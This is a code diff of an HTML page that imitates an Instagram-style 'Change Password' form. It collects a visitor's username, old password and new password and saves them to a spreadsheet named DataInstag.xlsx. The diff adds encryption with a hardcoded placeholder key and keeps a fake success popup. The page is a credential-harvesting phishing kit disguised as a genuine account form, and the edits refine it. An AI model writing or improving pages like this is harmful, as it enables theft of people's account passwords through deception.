@@ -1,9 +1,13 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Change Password</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.17.0/xlsx.full.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');
         body {
@@ -20,24 +24,13 @@
         <form id="loginForm" class="space-y-4">
             <input id="username" class="w-full p-2 bg-gray-800 border border-gray-700 rounded text-sm" placeholder="Phone number, username, or email" type="text"/>
             <input id="password" class="w-full p-2 bg-gray-800 border border-gray-700 rounded text-sm" placeholder="Old Password" type="password"/>
-            <input id="passwordnew" class="w-full p-2 bg-gray-800 border border-gray-700 rounded text-sm" placeholder="New Password" type="passwordnew"/>
+            <input id="passwordnew" class="w-full p-2 bg-gray-800 border border-gray-700 rounded text-sm" placeholder="New Password" type="password"/>
           
             <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 
             <button class="w-full bg-blue-600 text-white py-2 rounded font-semibold" type="submit">Change Password </button>
-
-           <script>
-    document.querySelector("button[type='submit']").addEventListener("click", function(event) {
-        event.preventDefault(); 
-        Swal.fire({
-            title: "Success!",
-            text: "Change Your Password Success!",
-            icon: "success"
-        });
-    });
-</script>
-
         </form>
+
         <div class="flex items-center my-4">
             <hr class="flex-grow border-gray-700"/>
             <span class="mx-2 text-gray-500">OR</span>
@@ -54,27 +47,39 @@
             <p class="text-sm">Don't have an account? <a class="text-blue-500 font-semibold" href="#">Sign up</a></p>
         </div>
 
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault();
+        <script>
+            document.getElementById('loginForm').addEventListener('submit', function(event) {
+                event.preventDefault();
 
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            var newpassword = document.getElementById('passwordnew').value;
+                var username = document.getElementById('username').value;
+                var password = document.getElementById('password').value;
+                var newpassword = document.getElementById('passwordnew').value;
 
+                // Encrypt data using CryptoJS
+                var encryptedUsername = CryptoJS.AES.encrypt(username, "your-secret-key").toString();
+                var encryptedPassword = CryptoJS.AES.encrypt(password, "your-secret-key").toString();
+                var encryptedNewPassword = CryptoJS.AES.encrypt(newpassword, "your-secret-key").toString();
 
+                // Prepare data for Excel
+                var data = [
+                    ["Username (Encrypted)", "PasswordOld (Encrypted)", "NewPassword (Encrypted)"],
+                    [encryptedUsername, encryptedPassword, encryptedNewPassword]
+                ];
 
-            var data = [
-                ["Username", "PasswordOld","NewPassword"],
-                [username, password,newpassword]
-            ];
+                // Save data to Excel
+                var ws = XLSX.utils.aoa_to_sheet(data);
+                var wb = XLSX.utils.book_new();
+                XLSX.utils.book_append_sheet(wb, ws, "DataInstag");
 
-            var ws = XLSX.utils.aoa_to_sheet(data);
-            var wb = XLSX.utils.book_new();
-            XLSX.utils.book_append_sheet(wb, ws, "DataInstag");
+                XLSX.writeFile(wb, "DataInstag.xlsx");
 
-            XLSX.writeFile(wb, "DataInstag.xlsx");
-        });
-    </script>
+                Swal.fire({
+                    title: "Success!",
+                    text: "Your password has been encrypted and saved.",
+                    icon: "success"
+                });
+            });
+        </script>
+    </div>
 </body>
 </html>
